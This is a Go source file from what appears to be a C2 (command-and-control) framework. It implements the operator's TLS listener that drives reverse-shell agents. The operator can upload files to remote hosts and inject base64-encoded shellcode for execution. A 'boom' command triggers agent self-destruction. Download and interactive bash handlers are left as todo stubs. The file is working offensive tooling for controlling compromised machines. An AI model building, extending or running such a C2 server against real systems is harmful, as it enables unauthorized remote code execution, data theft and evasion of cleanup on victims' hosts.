package useri

import (
	"encoding/binary"
	"fmt"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/remoteop"
	"github.com/kmahyyg/dumbc2/transport"
	"github.com/kmahyyg/dumbc2/utils"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

func StartServer(userOP config.UserOperation) {
	// server mode
	fladdr := userOP.ListenAddr
	lbserver, err := transport.TLSServerBuilder(fladdr, false)
	if err != nil {
		panic(err)
	}
	for true {
		if lbserver != nil {
			conn, err := lbserver.Accept()
			if err != nil {
				log.Println(err)
				continue
			}
			_ = conn.SetDeadline(time.Now().Add(time.Minute * 10))
			handleClient(conn)
		} else {
			log.Fatalln("Failed to bind.")
		}
	}
}


func printHelp(){
	fmt.Println(
`
Usage: 
bash = Get Shell (Interactive)
upload <Source File Path> <Destination File Path> = Upload file
download <Source File Path> <Destination File Path> = Download file
boom = Self-Destroy
exit = Close Program
help = Show This Message
inject <BASE64-Encoded Code> = Execute Shell Code
`)
}

func handleClient(conn net.Conn){
	// start as tls server, means it's a reverse shell
	printHelp()
	fmt.Println("Connection established.")
	fmt.Println("Commands: upload, download, boom, bash, exit, help, shellcode.\n")
	for true {
		fmt.Printf("[SERVER] %s [>_] $ ", conn.RemoteAddr().String())
		useript := utils.ReadUserInput()
		useriptD := strings.Split(useript, " ")
		var curRTCmd *remoteop.RTCommand
		var curPingBack *remoteop.PingBack
		switch useriptD[0] {
		case "upload":
			fd, err := os.Stat(useriptD[1])
			if err != nil {
				log.Println(err)
				continue
			}
			fdlen := func() int64 {
				size := fd.Size()
				return (size / 1048576) + 1
			}
			if fdlen() > 255 {
				log.Println("Exceeds max length, 253M")
				continue
			} else {
				buf := make([]byte,1)
				binary.PutVarint(buf, fdlen())
				curRTCmd = &remoteop.RTCommand{
					Command:        []byte("UPLD"),
					FilePathLocal:  []byte(useriptD[1]),
					FilePathRemote: []byte(useriptD[2]),
					FileLength:     buf[0],
					HasData:        byte(1),
				}
				err := curRTCmd.BuildnSend(conn)
				if err != nil {
					log.Println(err)
					continue
				}
				curPingBack, err = remoteop.ParseIncomingPB(conn)
				if err != nil {
					log.Println(err)
					continue
				}
				if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
					log.Println("Failed to execute command.")
				}
			}
		case "download":
			curRTCmd := &remoteop.RTCommand{
				Command:        []byte("DWLD"),
				FilePathLocal:  nil,
				FilePathRemote: []byte(useriptD[1]),
				FileLength:     0,
				HasData:        0,
				RealData:       nil,
			}
			//todo
		case "boom":
			curRTCmd := &remoteop.RTCommand{
				Command: []byte("BOOM"),
				HasData: 0,
			}
			err := curRTCmd.BuildnSend(conn)
			if err != nil {
				log.Println(err)
			}
			break
		case "bash":
			//todo
		case "inject":
			curRTCmd := &remoteop.RTCommand{
				Command:    []byte("INJE"),
				FileLength: 1, // Max 1M Allowed
				HasData:    1,
				RealData:   []byte(useriptD[1]),
			}
			_ = conn.SetReadDeadline(time.Now().Add(2 * time.Minute))
			err := curRTCmd.BuildnSend(conn)
			if err != nil {
				log.Println(err)
				continue
			}
			curPingBack, err := remoteop.ParseIncomingPB(conn)
			if err != nil {
				log.Println(err)
				_ = conn.SetReadDeadline(time.Now().Add(10 * time.Minute))
				continue
			}
			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
				log.Println("Function Execution Error. Agent may exits.")
				continue
			}
		case "exit":
			break
		case "help":
			fallthrough
		default:
			printHelp()
		}
	}
	defer func() { _ = conn.Close() }()
}
